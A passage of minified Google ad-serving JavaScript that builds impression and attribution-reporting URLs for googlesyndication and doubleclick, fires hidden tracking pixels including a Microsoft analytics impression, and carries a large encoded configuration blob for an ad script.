                destination: ["buyer"]
              });
            }
          } else e && (((f = a.X && Uc()) || a.Y) && x.fetch ? (g = {
            method: "GET",
            keepalive: !0
          }, f ? "setAttributionReporting" in XMLHttpRequest.prototype ? g.attributionReporting = {
            eventSourceEligible: !0,
            triggerEligible: !1
          } : g.headers = {
            "Attribution-Reporting-Eligible": "event-source"
          } : g.mode = "no-cors", x.fetch(eb(e, "&ftch=1"), g)) : Tc(e));
          0 === b && a.H.resolve();
        }
      }
    }
    function gd(a, b) {
      var c = null;
      b ? a.o = Z() : c = a.o ? Z() - a.o : "?";
      a = "https://pagead2.googlesyndication.com/pagead/gen_204?id=opxhb&evt=" + (b ? "d" : "o") + ("&eid=" + encodeURIComponent(a.P)) + (null == c ? "" : "&ttp=" + c);
      Tc(a);
    }
    function hd(a, b, c, d) {
      if ("" === a.I) return null;
      var e = {
        omid: a.j ? 1 : 0,
        rm: a.B,
        ctpt: d - a.N
      };
      0 !== b && (e.vt = b, e.dtpt = d - (a.M || 0));
      0 !== c && (e.cbvp = c);
      a.D && (e.dett = a.D);
      a.A && (e.beid = a.A.eventId, e.vend = a.A.vendor);
      null != a.C && (e.cstd = a.C);
      (b = T.bvst) && (e.cisv = b + ("." + a.U));
      0 !== a.K && (e.vwbs = a.K);
      a.G && (e.oprs = a.G);
      a.F && (e.opsd = a.F);
      (b = Zb(Pc).j) && (e.uach = b);
      e.arae = Number(Uc());
      var f = "";
      pb(e, function (g, h) {
        f += "&" + h + "=" + encodeURIComponent(g);
      });
      return eb(a.I, f);
    }
    function fd(a) {
      var b = a.P;
      if (b && (b = x["bllsn" + b], "function" === typeof b)) try {
        b(function (c) {
          c && (a.K = c.block ? 2 : 1);
        });
      } catch (c) {}
    }
    ;
    S().btrp = function (a, b) {
      var c = Yc = new Wc(a, b);
      return function (d) {
        Zc(c, d);
      };
    };
    S().pdib3 = function (a, b) {
      Yc.H.promise.then(function () {
        if (b) {
          var c = void 0 === c ? !1 : c;
          if (vb()) ub(window, a, null, !0, c);else {
            var d = x.document;
            if (d.body) {
              var e = d.getElementById("goog-srcless-iframe");
              e || (e = tb("IFRAME"), e.style.display = "none", e.id = "goog-srcless-iframe", d.body.appendChild(e));
              d = e;
            } else d = null;
            d && d.contentWindow && ub(d.contentWindow, a, null, !0, c);
          }
        } else U(a);
      });
    };
    S().vv = function () {
      var a = Zb(Pc);
      if (!a.h) throw Error("aiv::err");
      a.h();
    };
    S().sasrc = function (a) {
      Yc.H.promise.then(function () {
        var b = x.document.createElement("img");
        b.style.display = "none";
        b.attributionSrc = a;
        x.document.body.appendChild(b);
      });
    };
  }).call(this);
  window.stcc = btrp("https://googleads4.g.doubleclick.net/pcs/view?xai\x3dAKAOjsszZO-_dkR3Zmgz2d81iHtIzRSrQRDmr9nlAbiJyVT11Y0Y6q2yy3AC-vnRnylaIPt5b-6GGwppXbNsCv4bWAnPaBkfGSPVIMsHTBxR5mbj38owHRZ8A7UVDdjQKbggg2PZltY5NEGHkM6sMg7S0han3MYpyGVhzOg9yax8UZyKx7V9pzNVVUW9HbAGXThIV1M5ctiOokVkAP7rGO-6f4ctJG6t9plnAP0MxqD3hQ_2yRt-UB56cZk4teAMH3pqhV5taynF-p83n5TXuJ-ctcbptDvxe9CHvAke4rF6DdLR3k-FX5b0zX4LD22wozxKjXzfZQb4-3n9jwgRUpNlxiD-xcK2muMXSqS48JR0AqGSlo02nE7D6EoEVcObgjjDEiBE3iNM2os6QV_zV7QBLem4Jb1NR7V4ROWF3fBAnpWt8e0ytpr6sJjS_HQ6jaF-FFbYEV2-lw6s1OtXQLAB_eaTqolYrRpZlGlIcufNL99t__5ZQG7oGkclholtsMj6mEC9klUk0v5dKXXrOJKQTG4vYq1N3hycEivBENnCKe_7z8aQ2rrYijUgX8FS0e-dA2gtepkrSVIMsghaYqFvL4rhmV-2yTYioQjvJkvbHznjgiYNaihPD2XC5PXkUNWMHyRJ7T-GY7KngdzvIcHyoqyIPmlNrcMqJ-UPDP2BjwfOug-0kzaEaj5eQjml0JdxCz_z9Rp8nVKawIdyuNJ8uUSDAARAsiTwJBvRBPR0ny-e721xajRL3l3sIFb0QRUJsda6Gpm2JyC-LQ2vnHsHZVXW9NwejB8t42-3QD_J9l2yuy7mmhPGBqVGWu6il5kc49dOFFX0C4TaTpF6jLl9l9DchXtG_3VeVu3tudssezSHZm28BMIAK6_CUUpUxlf7O7ufYuX22T2OV1v3Er6_dNLkCJnr-c_-ZVvF7sxGglAK715bFlty6YKZBFGf1vcBkznboz7PxMmzrFQnWRHk1-pKr2feWGKlKZZI4x3myDiTnNoi-i7PNmE975kJquHNGJxZ08UaK-VdxGq2rhvWOpxts_B46zB4zItvTexrEIPOxdpVF9Y6k9nlaDN0mxR6l52lCSthvYlPkU0_hPHPuGiAs5hg5zAPSY5a7ZDwmTKs_7rUlscxNxG6XqJgyvTe7_oRlzHEXfil-ue0r6IBv8hKqbmxouRggsWzzsK9ssd-N2HR-q_SpoTVsP0kMxzoKEhn5Dijy6OL7r2IFcVVgsaf-dlvwUmIG6saFpxzQwcxiULGrl2Av-qqh3zHC6gFFSVa_zz_4u14F-lAcrWKxQy4aiHbuCYYnwnFgSkBnhRKUcOD_t_udMjm_KFl-FAXATZYz8M\x26sai\x3dAMfl-YRTgOlnxByrm1xqCiDqDGAk5vakiVqeUFTpDTX4MF5r-_i7PCmaLJps2dVf3ORlRAgK8illI9c96Ic6Ri76Jt5En__zX9bPxqtIIxhR_50r4nNkTSWiFgERGi1LQdcl-jfDCeClGcILp8msbk25jyWXreuFV0XA3IPMpYRShdxmk1OIiP6Pjqief-BJdRMYG8ibMtQUqO_mvO-1EiZY4ylYN9wb6tEOLVwlHdOGR_5GCTCnfrE9pF5EEFQDcjMn12dz9pw\x26sig\x3dCg0ArKJSzKpqaT_ia-bDEAE\x26uach_m\x3d[UACH]\x26cry\x3d1\x26fbs_aeid\x3d[gw_fbsaeid]\x26urlfix\x3d1\x26adurl\x3d", document.getElementById("gcc_ua_hZM_PD6DBvcAPjoWkoAQ"));
})();
(function () {
  (function () {
    (function () {
      var m = document.createElement('meta');
      m.setAttribute('data-jc', '78');
      m.setAttribute('data-jc-version', 'r20230816');
      var ss = document.getElementsByTagName('script')[0];
      if (ss && ss.parentNode) {
        ss.parentNode.insertBefore(m, ss);
      }
    })();
    (function () {
      /*  Copyright The Closure Library Authors. SPDX-License-Identifier: Apache-2.0 */var h = this || self;
      function k(a, c) {
        a = a.split(".");
        var b = h;
        a[0] in b || "undefined" == typeof b.execScript || b.execScript("var " + a[0]);
        for (var d; a.length && (d = a.shift());) a.length || void 0 === c ? b[d] && b[d] !== Object.prototype[d] ? b = b[d] : b = b[d] = {} : b[d] = c;
      }
      function l(a) {
        var c = typeof a;
        c = "object" != c ? c : a ? Array.isArray(a) ? "array" : c : "null";
        return "array" == c || "object" == c && "number" == typeof a.length;
      }
      function n(a) {
        var c = typeof a;
        return "object" == c && null != a || "function" == c;
      }
      function p(a) {
        return a;
      }
      ;
      var q = Array.prototype.forEach ? function (a, c) {
        Array.prototype.forEach.call(a, c, void 0);
      } : function (a, c) {
        for (var b = a.length, d = "string" === typeof a ? a.split("") : a, f = 0; f < b; f++) f in d && c.call(void 0, d[f], f, a);
      };
      function r(a) {
        var c = a.length;
        if (0 < c) {
          for (var b = Array(c), d = 0; d < c; d++) b[d] = a[d];
          return b;
        }
        return [];
      }
      ;
      function t(a, c) {
        for (var b in a) c.call(void 0, a[b], b, a);
      }
      ;
      var u;
      function v(a) {
        this.g = a;
      }
      v.prototype.toString = function () {
        return this.g + "";
      };
      v.prototype.h = !0;
      var w = {};
      function x(a, c) {
        t(c, function (b, d) {
          b && "object" == typeof b && b.h && (b = b.g.toString());
          "style" == d ? a.style.cssText = b : "class" == d ? a.className = b : "for" == d ? a.htmlFor = b : y.hasOwnProperty(d) ? a.setAttribute(y[d], b) : 0 == d.lastIndexOf("aria-", 0) || 0 == d.lastIndexOf("data-", 0) ? a.setAttribute(d, b) : a[d] = b;
        });
      }
      var y = {
        cellpadding: "cellPadding",
        cellspacing: "cellSpacing",
        colspan: "colSpan",
        frameborder: "frameBorder",
        height: "height",
        maxlength: "maxLength",
        nonce: "nonce",
        role: "role",
        rowspan: "rowSpan",
        type: "type",
        usemap: "useMap",
        valign: "vAlign",
        width: "width"
      };
      function z(a, c, b) {
        var d = arguments,
          f = document,
          e = d[1];
        var g = String(d[0]);
        g = String(g);
        "application/xhtml+xml" === f.contentType && (g = g.toLowerCase());
        g = f.createElement(g);
        e && ("string" === typeof e ? g.className = e : Array.isArray(e) ? g.className = e.join(" ") : x(g, e));
        2 < d.length && A(f, g, d);
        return g;
      }
      function A(a, c, b) {
        function d(m) {
          m && c.appendChild("string" === typeof m ? a.createTextNode(m) : m);
        }
        for (var f = 2; f < b.length; f++) {
          var e = b[f];
          if (!l(e) || n(e) && 0 < e.nodeType) d(e);else {
            a: {
              if (e && "number" == typeof e.length) {
                if (n(e)) {
                  var g = "function" == typeof e.item || "string" == typeof e.item;
                  break a;
                }
                if ("function" === typeof e) {
                  g = "function" == typeof e.item;
                  break a;
                }
              }
              g = !1;
            }
            q(g ? r(e) : e, d);
          }
        }
      }
      ; /*  SPDX-License-Identifier: Apache-2.0 */
      k("ait", function (a) {
        var c = z("IMG");
        c.src = a;
        c.border = "0";
        c.height = 1;
        c.width = 1;
        c.style.display = "none";
        document.body.appendChild(c);
      });
      k("ast", function (a) {
        var c;
        a = null === a ? "null" : void 0 === a ? "undefined" : a;
        if (void 0 === u) {
          var b = null;
          if ((c = h.trustedTypes) && c.createPolicy) {
            try {
              b = c.createPolicy("goog#html", {
                createHTML: p,
                createScript: p,
                createScriptURL: p
              });
            } catch (e) {
              h.console && h.console.error(e.message);
            }
            u = b;
          } else u = b;
        }
        a = (b = u) ? b.createScriptURL(a) : a;
        c = new v(a, w);
        b = a = document;
        b = void 0 === b ? document : b;
        b = b.createElement("script");
        b.src = c instanceof v && c.constructor === v ? c.g : "type_error:TrustedResourceUrl";
        var d, f;
        (d = (c = null == (f = (d = (b.ownerDocument && b.ownerDocument.defaultView || window).document).querySelector) ? void 0 : f.call(d, "script[nonce]")) ? c.nonce || c.getAttribute("nonce") || "" : "") && b.setAttribute("nonce", d);
        (d = a.getElementsByTagName("script")[0]) && d.parentNode && d.parentNode.insertBefore(b, d);
      });
    }).call(this);
    pdib3('https://analyticspixel.microsoft.com/aid/imp?dcmadvertiserid\x3d8391437\x26dcmcampaignid\x3d30205119\x26dcmadid\x3d560932281\x26dcmrenderingid\x3d184309400\x26dcmsiteid\x3d4091806\x26dcmplacementid\x3d370049272\x26customer\x3dMicrosoft\x26dv360auctionid\x3dABAjH0jMEY6CsTgx9amLN9ZLiOXY');
  })();
})();
window.addEventListener("load", gatherAndSendData);
(function () {
  if (!window.GoogleTyFxhY || typeof window.GoogleTyFxhY.push !== 'function') {
    window.GoogleTyFxhY = [];
  }
  window.GoogleTyFxhY.push({
    '_scs_': 'BEv5Rua_hZM_PD6DBvcAPjoWkoAQAAAAAOAHgBAI',
    '_bgu_': 'https://pagead2.googlesyndication.com/bg/-ux6i5uap_kgdJqLbszgrDc8lL0DO2SEHIjb65WwLNE.js',
    '_bgp_': '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